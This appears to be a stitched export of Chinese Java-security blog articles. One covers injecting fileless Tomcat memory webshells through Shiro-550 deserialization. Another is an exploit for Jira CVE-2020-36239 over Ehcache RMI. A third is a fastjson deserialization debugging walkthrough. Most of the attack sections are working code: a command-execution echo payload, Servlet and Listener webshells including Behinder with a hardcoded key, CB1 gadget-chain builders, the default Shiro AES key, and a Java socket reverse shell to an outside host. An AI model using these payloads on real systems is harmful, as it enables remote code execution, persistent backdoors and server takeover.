HTTPHeaderSize尝试之后发现并不可行，在执行过程中报错sun.misc.launcher$appclassloader cannot be cast to org.apache.catalina.loader.webappclassloaderbase大概意思就是未能转化webappclassloaderbase，最终选择使用通用版shiro回显的payload 0x1 注入Servlet普通内存马 这里使用fnmsd大佬提供的payload 获取request，通过编译之后只有3.8K的大小，这里需要继承AbstractTranslet类，因为要通过TemplatesImpl的实例化 import com.sun.org.apache.xalan.internal.xsltc.DOM; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator; import com.sun.org.apache.xml.internal.serializer.SerializationHandler; import javax.servlet.http.HttpServletRequest; import javax.servlet.http.HttpServletResponse; import java.lang.reflect.Field; import java.util.HashSet; import java.util.Scanner; public class Main extends AbstractTranslet { static HashSet h; static HttpServletRequest r; static HttpServletResponse p; public Main() { r = null; p = null; h = new HashSet(); F(Thread.currentThread(), 0); } private static boolean i(Object obj) { if (obj == null || h.contains(obj)) { return true; } h.add(obj); return false; } private static void p(Object o, int depth) { if (depth > 52 || (r != null && p != null)) { return; } if (!i(o)) { if (r == null && HttpServletRequest.class.isAssignableFrom(o.getClass())) { r = (HttpServletRequest) o; if (r.getParameter(\"cmd\") == null) { r = null; } else { try { p = (HttpServletResponse) r.getClass().getMethod(\"getResponse\").invoke(r); } catch (Exception e) { r = null; } } } if (r != null && p != null) { try { p.getWriter().println(new Scanner(Runtime.getRuntime().exec(r.getParameter(\"cmd\")).getInputStream()).useDelimiter(\"\\\\A\").next()); p.getWriter().flush(); } catch (Exception e) { } return; } F(o, depth + 1); } } private static void F(Object start, int depth) { Class n = start.getClass(); do { for (Field declaredField : n.getDeclaredFields()) { declaredField.setAccessible(true); Object o = null; try { o = declaredField.get(start); if (!o.getClass().isArray()) { p(o, depth); } else { for (Object q : (Object[]) o) { p(q, depth); } } } catch (Exception e) { } } } while ( (n = n.getSuperclass()) != null ); } @Override public void transform(DOM d, SerializationHandler[] h) { } @Override public void transform(DOM d, DTMAxisIterator i, SerializationHandler h) { } } 再编写CB1链的代码，通过读取Main.class再将其放置在TemplatesImpl的_bytecodes中，最后再反序列化生成cb1.ser package com.test; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import org.apache.commons.beanutils.BeanComparator; import java.io.*; import java.lang.reflect.Field; import java.util.PriorityQueue; public class CB1Test { public static void main(String[] args) throws Exception { byte[] clazzBytes = getBytes(); TemplatesImpl templates = TemplatesImpl.class.newInstance(); setFieldValue(templates, \"_bytecodes\", new byte[][]{clazzBytes}); setFieldValue(templates, \"_name\", \"HelloTemplatesImpl\"); setFieldValue(templates, \"_tfactory\", new TransformerFactoryImpl()); BeanComparator comparator = new BeanComparator(null, String.CASE_INSENSITIVE_ORDER); PriorityQueue queue = new PriorityQueue(2, comparator); queue.add(\"1\"); queue.add(\"1\"); setFieldValue(comparator, \"property\", \"outputProperties\"); setFieldValue(queue, \"queue\", new Object[]{templates, templates}); try{ FileOutputStream fileOutputStream = new FileOutputStream(\"cb1.ser\"); ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream); objectOutputStream.writeObject(queue); }catch (Exception e){ e.printStackTrace(); } } public static void setFieldValue(Object object, String field, Object args) throws Exception { Field f0 = object.getClass().getDeclaredField(field); f0.setAccessible(true); f0.set(object,args); } public static byte[] getBytes() throws Exception { String tomcatEcho = \"\"; InputStream inputStream = new FileInputStream(tomcatEcho); ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream(); int n = 0; while ((n=inputStream.read())!=-1){ byteArrayOutputStream.write(n); } byte[] bytes = byteArrayOutputStream.toByteArray(); return bytes; } } 然后在shiro中对上一步生成的cb1进行base64编码+AES加密 package com.test; import org.apache.shiro.codec.Base64; import org.apache.shiro.crypto.AesCipherService; import org.apache.shiro.util.ByteSource; import java.io.ByteArrayOutputStream; import java.io.FileInputStream; import java.io.InputStream; public class AESEncode { public static void main(String[] args)throws Exception { String tomcatEcho = \"\"; byte[] key = Base64.decode(\"kPH+bIxk5D2deZiIxcaaaA==\"); AesCipherService aes = new AesCipherService(); ByteSource ciphertext = aes.encrypt(getBytes(tomcatEcho), key); System.out.printf(ciphertext.toString()); } public static byte[] getBytes(String path) throws Exception{ InputStream inputStream = new FileInputStream(path); ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream(); int n = 0; while ((n=inputStream.read())!=-1){ byteArrayOutputStream.write(n); } byte[] bytes = byteArrayOutputStream.toByteArray(); return bytes; } } 第一步首先编译Main.java 第二步，将编译生成的Main.class写入到TemplatesImpl._bytecodes中 第三步，将序列化得到的CB1.ser通过AES加密，放置到Cookie的rememberMe字段中 最后携带参数即可执行命令 在此过程中我们可以发现，要执行命令就必须得带上这一串臃肿的Cookie，这显然与我们的注入内存马还是有点偏差，那么需要如何改造呢？当然还是得注入Servlet或者Listener 如果在fnmsd大佬提供的payload，那么还是会超过MaxHTTPHeaderSize，那么我们知道HTTP协议中POST请求的参数可以携带大体积的参数，那么就只需要在该payload中再添加一个反序列化点，在POST请求体中获取反序列化的地方，进行反序列化完成二次注入，这样来执行命令 首先完善payload，加上获取data参数的逻辑，再进行反序列化 import com.sun.org.apache.xalan.internal.xsltc.DOM; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator; import com.sun.org.apache.xml.internal.serializer.SerializationHandler; import sun.misc.BASE64Decoder; import javax.servlet.http.HttpServletRequest; import javax.servlet.http.HttpServletResponse; import java.io.ByteArrayInputStream; import java.io.ObjectInputStream; import java.lang.reflect.Field; import java.util.HashSet; import java.util.Scanner; public class Main extends AbstractTranslet { static HashSet h; static HttpServletRequest r; static HttpServletResponse p; public Main() { r = null; p = null; h = new HashSet(); F(Thread.currentThread(), 0); } private static boolean i(Object obj) { if (obj == null || h.contains(obj)) { return true; } h.add(obj); return false; } private static void p(Object o, int depth) { if (depth > 52 || (r != null && p != null)) { return; } if (!i(o)) { if (r == null && HttpServletRequest.class.isAssignableFrom(o.getClass())) { r = (HttpServletRequest) o; if (r.getParameter(\"cmd\") == null) { r = null; } else { try { p = (HttpServletResponse) r.getClass().getMethod(\"getResponse\").invoke(r); } catch (Exception e) { r = null; } } } if (r != null && p != null) { try { if(r.getParameter(\"data\")!=null){ byte[] buff = new BASE64Decoder().decodeBuffer(r.getParameter(\"data\")); ByteArrayInputStream bai = new ByteArrayInputStream(buff); ObjectInputStream ois = new ObjectInputStream(bai); ois.readObject(); }else{ p.getWriter().println(new Scanner(Runtime.getRuntime().exec(r.getParameter(\"cmd\")).getInputStream()).useDelimiter(\"\\\\A\").next()); p.getWriter().flush(); } } catch (Exception e) { } return; } F(o, depth + 1); } } private static void F(Object start, int depth) { Class n = start.getClass(); do { for (Field declaredField : n.getDeclaredFields()) { declaredField.setAccessible(true); Object o = null; try { o = declaredField.get(start); if (!o.getClass().isArray()) { p(o, depth); } else { for (Object q : (Object[]) o) { p(q, depth); } } } catch (Exception e) { } } } while ( (n = n.getSuperclass()) != null ); } @Override public void transform(DOM d, SerializationHandler[] h) { } @Override public void transform(DOM d, DTMAxisIterator i, SerializationHandler h) { } } 然后这里使用天下大木头的TomcatEcho.java的代码，修改修改，使用遍历Thread获取request public static HttpServletRequest getRequest() { try { boolean flag = false; Thread[] threads = (Thread[]) getField(Thread.currentThread().getThreadGroup(), \"threads\"); for (int i = 0; i 当获取到request之后，完成注入servlet的代码 static { HttpServletRequest request = getRequest(); ServletContext servletContext = request.getSession().getServletContext(); if (servletContext == null) { System.out.println(\"未获取到servletContext\"); } else { try { Field appctx = servletContext.getClass().getDeclaredField(\"context\"); appctx.setAccessible(true); ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext); Field stdctx = applicationContext.getClass().getDeclaredField(\"context\"); stdctx.setAccessible(true); StandardContext standardContext = (StandardContext) stdctx.get(applicationContext); Servlet demo = new Behinder(); org.apache.catalina.Wrapper demoWrapper = standardContext.createWrapper(); //设置Servlet名等 demoWrapper.setName(servletName); demoWrapper.setLoadOnStartup(1); demoWrapper.setServlet(demo); demoWrapper.setServletClass(demo.getClass().getName()); standardContext.addChild(demoWrapper); //设置ServletMap standardContext.addServletMapping(servletUrlPattern, servletName); System.out.println(\"success\"); } catch (Exception e) { try { java.lang.Runtime.getRuntime().exec(\"open /System/Applications/Calculator.app\"); } catch (Exception a) { a.printStackTrace(); } System.out.println(\"失败了！草\"); e.printStackTrace(); } } } 最后再在servlet的service中添加恶意代码 @Override public void service(ServletRequest servletRequest, ServletResponse servletResponse) throws ServletException, IOException { try { System.out.println(\"do service\"); HttpServletRequest request = (HttpServletRequest) servletRequest; HttpServletResponse response = (HttpServletResponse) servletResponse; response.getWriter().println(new Scanner(Runtime.getRuntime().exec(request.getParameter(\"cmd2\")).getInputStream()).useDelimiter(\"\\\\A\").next()); response.getWriter().flush(); } catch (Exception e) { e.printStackTrace(); } } 完整代码如下： import com.sun.org.apache.xalan.internal.xsltc.DOM; import com.sun.org.apache.xalan.internal.xsltc.TransletException; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator; import com.sun.org.apache.xml.internal.serializer.SerializationHandler; import org.apache.catalina.core.ApplicationContext; import org.apache.catalina.core.StandardContext; import org.apache.coyote.Request; import org.apache.coyote.RequestInfo; import javax.crypto.Cipher; import javax.crypto.spec.SecretKeySpec; import javax.servlet.*; import javax.servlet.http.HttpServletRequest; import javax.servlet.http.HttpServletResponse; import javax.servlet.http.HttpSession; import java.io.IOException; import java.lang.reflect.Field; import java.lang.reflect.Method; import java.util.HashMap; import java.util.List; import java.util.Scanner; public class Behinder extends AbstractTranslet implements Servlet { private final static String servletUrlPattern = \"/*\"; private final static String servletName = \"test\"; public Behinder() { } static { HttpServletRequest request = getRequest(); ServletContext servletContext = request.getSession().getServletContext(); if (servletContext == null) { System.out.println(\"未获取到servletContext\"); } else { try { Field appctx = servletContext.getClass().getDeclaredField(\"context\"); appctx.setAccessible(true); ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext); Field stdctx = applicationContext.getClass().getDeclaredField(\"context\"); stdctx.setAccessible(true); StandardContext standardContext = (StandardContext) stdctx.get(applicationContext); Servlet demo = new Behinder(); org.apache.catalina.Wrapper demoWrapper = standardContext.createWrapper(); //设置Servlet名等 demoWrapper.setName(servletName); demoWrapper.setLoadOnStartup(1); demoWrapper.setServlet(demo); demoWrapper.setServletClass(demo.getClass().getName()); standardContext.addChild(demoWrapper); //设置ServletMap standardContext.addServletMapping(servletUrlPattern, servletName); System.out.println(\"success\"); } catch (Exception e) { try { java.lang.Runtime.getRuntime().exec(\"open /System/Applications/Calculator.app\"); } catch (Exception a) { a.printStackTrace(); } System.out.println(\"失败了！草\"); e.printStackTrace(); } } } public static HttpServletRequest getRequest() { try { boolean flag = false; Thread[] threads = (Thread[]) getField(Thread.currentThread().getThreadGroup(), \"threads\"); for (int i = 0; i 然后使用CB1序列化成文件，通过data参数传输过去 步骤 首先先使用shiro的反序列化，先序列化Main.class，通过base64编码+AES编码之后查看payload是否可用 然后将需要注入的servlet通过cb1序列化 再使用POST请求，data参数携带这一串base64编码之后的CB1.ser，传输的时候一定要记得url编码 然后去掉Cookie，所有的参数，使用cmd2参数执行命令 当普通马都能注入，那就继续注入冰蝎马（这里说一下，为什么我对冰歇情有独钟😂，普通马在url中可以执行其实也行，主要是客户端webshell管理工具用起来真的很爽😂） 0x2 注入Servlet 冰歇马 同Tomcat内存马无文件攻击中的Servlet注入冰歇马一样，同样通过在service方法中添加冰歇马 @Override public void service(ServletRequest servletRequest, ServletResponse servletResponse) throws ServletException, IOException { try { System.out.println(\"do service\"); // 获取request和response对象 HttpServletRequest request = (HttpServletRequest) servletRequest; HttpServletResponse response = (HttpServletResponse) servletResponse; HttpSession session = request.getSession(); //create pageContext HashMap pageContext = new HashMap(); pageContext.put(\"request\", request); pageContext.put(\"response\", response); pageContext.put(\"session\", session); if (request.getMethod().equals(\"POST\")) { String k = \"e45e329feb5d925b\";/*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/ session.putValue(\"u\", k); Cipher c = Cipher.getInstance(\"AES\"); c.init(2, new SecretKeySpec(k.getBytes(), \"AES\")); //revision BehinderFilter Method method = Class.forName(\"java.lang.ClassLoader\").getDeclaredMethod(\"defineClass\", byte[].class, int.class, int.class); method.setAccessible(true); byte[] evilclass_byte = c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine())); Class evilclass = (Class) method.invoke(this.getClass().getClassLoader(), evilclass_byte,0, evilclass_byte.length); evilclass.newInstance().equals(pageContext); return; } } catch (Exception e) { e.printStackTrace(); } } 完整代码如下 import com.sun.org.apache.xalan.internal.xsltc.DOM; import com.sun.org.apache.xalan.internal.xsltc.TransletException; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator; import com.sun.org.apache.xml.internal.serializer.SerializationHandler; import org.apache.catalina.core.ApplicationContext; import org.apache.catalina.core.StandardContext; import org.apache.coyote.Request; import org.apache.coyote.RequestInfo; import javax.crypto.Cipher; import javax.crypto.spec.SecretKeySpec; import javax.servlet.*; import javax.servlet.http.HttpServletRequest; import javax.servlet.http.HttpServletResponse; import javax.servlet.http.HttpSession; import java.io.IOException; import java.lang.reflect.Field; import java.lang.reflect.Method; import java.util.HashMap; import java.util.List; import java.util.Scanner; public class Behinder extends AbstractTranslet implements Servlet { private final static String servletUrlPattern = \"/*\"; private final static String servletName = \"test\"; public Behinder() { } static { HttpServletRequest request = getRequest(); ServletContext servletContext = request.getSession().getServletContext(); if (servletContext == null) { System.out.println(\"未获取到servletContext\"); } else { try { Field appctx = servletContext.getClass().getDeclaredField(\"context\"); appctx.setAccessible(true); ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext); Field stdctx = applicationContext.getClass().getDeclaredField(\"context\"); stdctx.setAccessible(true); StandardContext standardContext = (StandardContext) stdctx.get(applicationContext); Servlet demo = new Behinder(); org.apache.catalina.Wrapper demoWrapper = standardContext.createWrapper(); //设置Servlet名等 demoWrapper.setName(servletName); demoWrapper.setLoadOnStartup(1); demoWrapper.setServlet(demo); demoWrapper.setServletClass(demo.getClass().getName()); standardContext.addChild(demoWrapper); //设置ServletMap standardContext.addServletMapping(servletUrlPattern, servletName); System.out.println(\"success\"); } catch (Exception e) { try { java.lang.Runtime.getRuntime().exec(\"open /System/Applications/Calculator.app\"); } catch (Exception a) { a.printStackTrace(); } System.out.println(\"失败了！草\"); e.printStackTrace(); } } } public static HttpServletRequest getRequest() { try { boolean flag = false; Thread[] threads = (Thread[]) getField(Thread.currentThread().getThreadGroup(), \"threads\"); for (int i = 0; i 同上步骤，在data参数处，反序列化以上代码生成的序列化文件 首先生成cookie，查看是否正常 再将Servlet内存冰歇马序列化，最后再通过data参数传输 0x3 注入Listener冰歇内存马 同Tomcat内存马无文件攻击中的Listener注入冰歇马一样 import com.sun.org.apache.xalan.internal.xsltc.DOM; import com.sun.org.apache.xalan.internal.xsltc.TransletException; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator; import com.sun.org.apache.xml.internal.serializer.SerializationHandler; import org.apache.catalina.core.ApplicationContext; import org.apache.catalina.core.StandardContext; import org.apache.coyote.Request; import org.apache.coyote.RequestInfo; import javax.crypto.Cipher; import javax.crypto.spec.SecretKeySpec; import javax.servlet.*; import javax.servlet.http.HttpServletRequest; import javax.servlet.http.HttpServletResponse; import javax.servlet.http.HttpSession; import java.lang.reflect.Field; import java.lang.reflect.Method; import java.util.HashMap; import java.util.List; public class BehinderListener extends AbstractTranslet implements ServletRequestListener { public BehinderListener() { } static { HttpServletRequest request = getRequest(); ServletContext servletContext = request.getSession().getServletContext(); if (servletContext == null) { System.out.println(\"未获取到servletContext\"); } else { try { Field appctx = servletContext.getClass().getDeclaredField(\"context\"); appctx.setAccessible(true); ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext); Field stdctx = applicationContext.getClass().getDeclaredField(\"context\"); stdctx.setAccessible(true); StandardContext standardContext = (StandardContext) stdctx.get(applicationContext); ServletRequestListener listener = new BehinderListener(); standardContext.addApplicationEventListener(listener); } catch (Exception e) { try { java.lang.Runtime.getRuntime().exec(\"open /System/Applications/Calculator.app\"); } catch (Exception a) { a.printStackTrace(); } System.out.println(\"失败了！草\"); e.printStackTrace(); } } } public static HttpServletRequest getRequest() { try { boolean flag = false; Thread[] threads = (Thread[]) getField(Thread.currentThread().getThreadGroup(), \"threads\"); for (int i = 0; i 提出问题 在天下大木头的github中，提供的payload-TomcatEcho.ser、TomcatEcho.java中，我在本地编译生成TomcatEcho.class，以及TomcatEcho.ser文件大小都超过了MaxHTTPHeaderSize，我自己编译的文件都无法反序列化，但是天下大木头提供的TomcatEcho.ser就可以注入成功，该环境下的tomcatHeader.ser、tomcatInject.ser无法使用，报错为文章开头的未能转化webappclassloaderbase 参考链接 fnmsd-Java中间件通用回显方法的问题及处理 fnmsd-通用版shiro回显 天下大木头-ShiroVulnEnv Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-05-19 16:23:41 Author: aaron Url: https://byaaronluo.github.io/知识库/02.JAVA安全/14.Shiro550无文件内存马/ Source: aaron 知识库 This article was originally published in「aaron 知识库」,Reproduced please indicate the source, thank you for cooperation! "},"知识库/02.JAVA安全/15.Jira_CVE2020-36239_RCE/":{"url":"知识库/02.JAVA安全/15.Jira_CVE2020-36239_RCE/","title":"15.Jira_CVE2020-36239_RCE","keywords":"","body":" 简介 背景 漏洞分析 漏洞触发点 漏洞验证 EXP 参考链接 简介 2021 年 7 月 9 日上午 5:44 Jira 官方发布公告 《Jira 数据中心和 Jira 服务管理数据中心 - Ehcache RMI 缺少身份验证 - CVE-2020-36239(https://jira.atlassian.com/browse/JSDSERVER-8454)》, 该漏洞影响多个产品的多个版本,官方已给出修复方法。详细请关注 Jira 官网，将软件更新至安全版本: https://jira.atlassian.com/ 背景 由于在复现CVE2020-36239这个漏洞的时候，使用ysoserial项目中的代码，执行CB1，无法成功利用反弹shell，执行任意命令，导致一直在找问题，最后通过和同事沟通，发现该漏洞存在的Commons Beanutils 确实是可以利用，但是Commons Collections 版本较高，是无法利用成功的；仔细查看其实所有的CC链，CB链其实就是代码执行，只是执行的代码是Runtime.getRuntime.exec(cmd)，其中cmd为需要执行的命令，在部署的目标测试环境，通过实验最后得知，在使用Runtime.getRuntime.exec(cmd)是无法执行命令（反弹shell）最后通过修改代码执行逻辑，使用Java的socket编程来反弹shell。 漏洞分析 根据官方的描述该漏洞是因为: 暴露了一个 Ehcache RMI 网络服务，攻击者可以在端口 40001 和潜在的 40011 上连接到该服务，由于缺少身份验证漏洞，可以通过反序列化在 Jira 中执行他们选择的任意代码 使用Nmap扫描 nmap -T 4 -A 10.1.1.13 -p 40001 其中绑定的name为rmi://com.atlassian.jira.index.property.CachingPluginIndexConfigurationManager.cacheByEntityKey;绑定的实例接口为net.sf.ehcache.distribution.RMICachePeer_Stub 漏洞触发点 在 net.sf.ehcache.distribution.RMICachePeer_Stub 找触发点, 官方通报中说是 Ehcache 暴露的 RMI 服务，所以实体类应该也在 Ehcache 包里 在绑定的 net.sf.ehcache.distribution.RMICachePeer_Stub类中的 getQuiet方法接收的参数是 Serializeable对象，这里就是漏洞的触发点 漏洞验证 所有绑定的 name, 都是绑定 net.sf.ehcache.distribution.RMICachePeer_Stub, 所以随机选一个就可以了， 使用 URLDNS 验证了漏洞确实存在 package com.myproject.temp; import net.sf.ehcache.distribution.RMICachePeer_Stub; import java.lang.reflect.Field; import java.net.URL; import java.rmi.Naming; import java.util.HashMap; public class Test { public static void main(String[] args) throws Exception { URL url = new URL(\"http://vd2vvt.dnslog.cn\"); HashMap hashMap = new HashMap(); hashMap.put(url,\"hhh\"); Field field = URL.class.getDeclaredField(\"hashCode\"); field.setAccessible(true); field.setInt(url,-1); RMICachePeer_Stub rmiCachePeer_stub = (RMICachePeer_Stub) Naming.lookup(\"rmi://10.1.1.13:40001/com.atlassian.jira.index.property.CachingPluginIndexConfigurationManager.cacheByEntityKey\"); rmiCachePeer_stub.getQuiet(hashMap); } } 通过查看Jira 是否用了存在利用链的包，Commons-Collection 都用了相对安全的版本，但是 Commons-Beanutils 1.9.4 存在利用链，那么就可以利用CB1来构造序列化对象 EXP 首先编写shell.java，利用socket 编程反弹shell到目标地址，注意这里一定要写进无参构造函数，因为利用CB1链，通过javassit写入到新的类，再将其转换成bytecode 放在TemplatesImpl._bytecodes时，最后执行的是newInstance()，也就是实例化的过程，需要放在构造函数中 package com.myproject.temp; public class shell { public shell(){ try{ String host = \"xxx.xxx.xxx.xxx\"; int port = port; String cmd = \"/bin/bash\"; java.lang.Process p = new java.lang.ProcessBuilder(cmd).redirectErrorStream(true).start(); java.net.Socket s = new java.net.Socket(host, port); java.io.InputStream pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream(); java.io.OutputStream po = p.getOutputStream(), so = s.getOutputStream(); while (!s.isClosed()) { while (pi.available() > 0) { so.write(pi.read()); } while (pe.available() > 0) { so.write(pe.read()); } while (si.available() > 0) { po.write(si.read()); } so.flush(); po.flush(); Thread.sleep(50); try { p.exitValue(); break; } catch (Exception e) { } } p.destroy(); s.close(); }catch (Exception e){} } public static void main(String[] args) { System.out.println(123); } } 然后需要编写一个ClassLoader，让javassist从源中读取该类文件，并返回CtClass对该类文件的对象的引用，主要原因是因为要将shell.class 转换成base64编码进行写入，最后再通过classloader进行解码，再将其转换成bytecode，放入到Templates._bytecode中 这里参考的是Y4er——ysoserial大哥更改后的项目 package com.myproject.temp; import java.io.ByteArrayInputStream; import java.io.ByteArrayOutputStream; import java.lang.reflect.Method; import java.net.URL; import java.net.URLClassLoader; import java.util.zip.GZIPInputStream; public class ClassLoaderTemplate { static String b64; static { try { GZIPInputStream gzipInputStream = new GZIPInputStream(new ByteArrayInputStream(base64Decode(b64))); ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream(); byte[] bs = new byte[4096]; int read; while ((read = gzipInputStream.read(bs)) != -1) { byteArrayOutputStream.write(bs, 0, read); } byte[] bytes = byteArrayOutputStream.toByteArray(); ClassLoader classLoader = new URLClassLoader(new URL[0], Thread.currentThread().getContextClassLoader()); Method defineClass = classLoader.getClass().getSuperclass().getSuperclass().getDeclaredMethod(\"defineClass\", byte[].class, int.class, int.class); defineClass.setAccessible(true); Class invoke = (Class) defineClass.invoke(classLoader, bytes, 0, bytes.length); invoke.newInstance(); } catch (Exception e) { // e.printStackTrace(); } } public static byte[] base64Decode(String bs) throws Exception { Class base64; byte[] value = null; try { base64 = Class.forName(\"java.util.Base64\"); Object decoder = base64.getMethod(\"getDecoder\", null).invoke(base64, null); value = (byte[]) decoder.getClass().getMethod(\"decode\", new Class[]{String.class}).invoke(decoder, new Object[]{bs}); } catch (Exception e) { try { base64 = Class.forName(\"sun.misc.BASE64Decoder\"); Object decoder = base64.newInstance(); value = (byte[]) decoder.getClass().getMethod(\"decodeBuffer\", new Class[]{String.class}).invoke(decoder, new Object[]{bs}); } catch (Exception e2) { } } return value; } } 最后再将CB1的逻辑完成，如下所示 PriorityQueue queue = new PriorityQueue(2); queue.add(1); queue.add(1); Constructor constructor = Class.forName(\"org.apache.commons.beanutils.BeanComparator\").getDeclaredConstructor(); BeanComparator comparator = (BeanComparator) constructor.newInstance(); Field f3 = Class.forName(\"org.apache.commons.beanutils.BeanComparator\").getDeclaredField(\"property\"); f3.setAccessible(true); f3.set(comparator,\"outputProperties\"); Field f4 = queue.getClass().getDeclaredField(\"comparator\"); f4.setAccessible(true); f4.set(queue,comparator); Field f5 = queue.getClass().getDeclaredField(\"queue\"); f5.setAccessible(true); Object[] queueArray = (Object[]) f5.get(queue); queueArray[0] = templates; 完整代码如下 package com.myproject.temp; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import javassist.ClassClassPath; import javassist.ClassPool; import javassist.CtClass; import net.sf.ehcache.distribution.RMICachePeer_Stub; import org.apache.commons.beanutils.BeanComparator; import org.apache.commons.codec.binary.Base64; import org.apache.wicket.util.file.Files; import java.io.ByteArrayOutputStream; import java.io.File; import java.io.Serializable; import java.lang.reflect.Constructor; import java.lang.reflect.Field; import java.rmi.Naming; import java.util.PriorityQueue; import java.util.zip.GZIPOutputStream; public class Test_2 { public static void main(String[] args) throws Exception { byte[] ctBytes = Files.readBytes(new File(\"/Users/aaronluo/Documents/CodeReview/JavaCode/Project/target/classes/com/myproject/temp/shell.class\")); ClassPool pool = ClassPool.getDefault(); pool.insertClassPath(new ClassClassPath(AbstractTranslet.class)); CtClass superC = pool.get(AbstractTranslet.class.getName()); CtClass ctClass; ctClass = pool.get(\"com.myproject.temp.ClassLoaderTemplate\"); ctClass.setName(ctClass.getName() + System.nanoTime()); ByteArrayOutputStream outBuf = new ByteArrayOutputStream(); GZIPOutputStream gzipOutputStream = new GZIPOutputStream(outBuf); gzipOutputStream.write(ctBytes); gzipOutputStream.close(); String content = \"b64=\\\"\" + Base64.encodeBase64String(outBuf.toByteArray()) + \"\\\";\"; ctClass.makeClassInitializer().insertBefore(content); ctClass.setSuperclass(superC); ctClass.writeFile(); byte[] classBytes = ctClass.toBytecode(); byte[][] targetByteCodes = new byte[][]{classBytes}; TemplatesImpl templates = TemplatesImpl.class.newInstance(); Field f = templates.getClass().getDeclaredField(\"_name\"); f.setAccessible(true); f.set(templates,\"123\"); Field f1 = templates.getClass().getDeclaredField(\"_bytecodes\"); f1.setAccessible(true); f1.set(templates,targetByteCodes); Field f2 = templates.getClass().getDeclaredField(\"_class\"); f2.setAccessible(true); f2.set(templates,null); PriorityQueue queue = new PriorityQueue(2); queue.add(1); queue.add(1); Constructor constructor = Class.forName(\"org.apache.commons.beanutils.BeanComparator\").getDeclaredConstructor(); BeanComparator comparator = (BeanComparator) constructor.newInstance(); Field f3 = Class.forName(\"org.apache.commons.beanutils.BeanComparator\").getDeclaredField(\"property\"); f3.setAccessible(true); f3.set(comparator,\"outputProperties\"); Field f4 = queue.getClass().getDeclaredField(\"comparator\"); f4.setAccessible(true); f4.set(queue,comparator); Field f5 = queue.getClass().getDeclaredField(\"queue\"); f5.setAccessible(true); Object[] queueArray = (Object[]) f5.get(queue); queueArray[0] = templates; Serializable payload = (Serializable) queue; RMICachePeer_Stub rmiCachePeer_stub = (RMICachePeer_Stub) Naming.lookup(\"rmi://10.1.1.13:40001/com.atlassian.jira.index.property.CachingPluginIndexConfigurationManager.cacheByEntityKey\"); rmiCachePeer_stub.getQuiet(payload); } } 参考链接 https://forum.butian.net/share/653 Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-05-19 16:08:50 Author: aaron Url: https://byaaronluo.github.io/知识库/02.JAVA安全/15.Jira_CVE2020-36239_RCE/ Source: aaron 知识库 This article was originally published in「aaron 知识库」,Reproduced please indicate the source, thank you for cooperation! "},"知识库/02.JAVA安全/16.fastJson反序列化原理及利用/":{"url":"知识库/02.JAVA安全/16.fastJson反序列化原理及利用/","title":"16.fastJson反序列化原理及利用","keywords":"","body":" 引入fastJson 1.2.24 调试 结论 测试 通过getter触发gadget getter gadget链路 通过setter方法触发gadget Setter gadget 链路 引入fastJson 1.2.24 环境：jdk8u181 为了方便切换fastjson的各个版本，我创建一个maven项目，在pom.xml引入FastJson junit junit 4.11 test com.alibaba fastjson 1.2.24 然后写一个简单的javaBean package com.aaron.test; public class User { private String name; private String age; public String getName() { System.out.println(\"getName is running!\"); return name; } public void setName(String name) { System.out.println(\"SetName is running!\"); this.name = name; } public String getAge() { return age; } public void setAge(String age) { this.age = age; } @Override public String toString(){ return \"User{\" + \"name='\" + name + '\\'' + ',' + \"age='\" + age + '\\'' + '}'; } } 在以上基础上，构建一个Main类，使用fastjson来解析 package com.aaron.test; import com.alibaba.fastjson.JSON; public class Main { public static void main(String[] args) { String json = \"{\\\"@type\\\":\\\"com.aaron.test.User\\\", \\\"name\\\":\\\"aaron\\\",\\\"age\\\":\\\"23\\\"}\"; Object obj = JSON.parse(json); System.out.println(obj); } } 运行main方法 fastjson 会解析该字符串，将其解析成object，就可以看到解析完成之后的User{name='aaron', age='23'}，在这个过程中，SetName 方法是被调用了 上面代码中输出的是一个Object类型的对象，但是从输出结果中看到该Object对象已经被解析为了User类型的对象。这就是json数据中的@type属性起的作用， Fastjson支持在json数据中使用@type属性指定该json数据被反序列为什么类型的对象。 同时控制台也输出了 SetName is running! ， 说明在反序列化对象时，会执行javabean的setter方法为其属性赋值。 调试 调试fastjson可让我花了不少力气，虽然我们都知道触发漏洞是在getter/setter处，fastjson会直接反射需要反序列化的类，并调用setter方法进行赋值，但是这个调试真是太麻烦了！ 那么就开始调试！我丢！ 强制进入parse函数 首先进入之后就会调用parse()函数，继续进入parse()函数 依次步进，在这里又调用了parser对象的parse方法，继续进入 继续进入parse函数 单步运行，直到case 12，这里调用了parseObject函数，继续进入 进入parseObject函数，继续单步 在这里调用了deserializer实例方法的deserializer函数，看这个函数有点像，而且还传入了this(分析上下文应该是传入待解析的json)，clazz，还有filedname，这里其实clazz已经从@type处已经找到字节码了 进入deserializer方法，在这里有个巨坑，强制进入都一直进不去，我只有手动进入，艹！ 第一次手动进入，就到下面这个函数，这个函数继续手动进入deserializer函数 到这个函数，打上断点才可以继续调试 